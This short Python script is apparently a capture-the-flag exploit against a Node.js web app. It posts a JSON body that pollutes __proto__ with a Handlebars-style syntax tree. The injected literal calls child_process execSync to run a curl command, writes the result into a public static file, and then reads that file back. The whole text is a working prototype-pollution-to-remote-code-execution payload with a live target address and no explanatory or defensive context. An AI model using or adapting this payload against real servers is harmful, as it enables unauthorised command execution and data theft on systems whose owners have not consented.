import requests

#TARGET_URL = 'http://localhost:1337'
TARGET_URL = 'http://188.166.145.178:30963'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = {
    "song.name":"Not Polluting with the boys",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`curl http://12.0.0.1 > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })

print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/out').text)
